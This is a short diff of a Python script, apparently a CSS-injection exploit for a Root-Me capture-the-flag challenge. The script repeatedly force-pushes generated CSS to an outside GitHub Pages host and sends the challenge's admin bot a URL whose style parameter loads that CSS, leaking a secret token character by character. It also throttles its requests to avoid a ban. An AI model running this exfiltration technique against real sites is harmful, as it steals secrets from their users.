@@ -116,7 +116,7 @@ def build_css(chars):
 
 # ----
 chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
-know  = "ruW-tjL1BWCdhbiOSCA7" 
+know  = "ruW-tjL1BWCdhbiOSCA7=" 
 
 # envoie à admin 
 while 1:
@@ -131,7 +131,7 @@ while 1:
         os.system('git push -f')
 
         # request POST
-        sleep(10) # for not to ban
+        sleep(20) # for not to ban
         data = {"url":"http://challenge01.root-me.org:58005/?style=//kixisaleesd.github.io/test/a"}
         r = requests.post("http://challenge01.root-me.org:58005/?style=light", data=data)
         print(r.content)
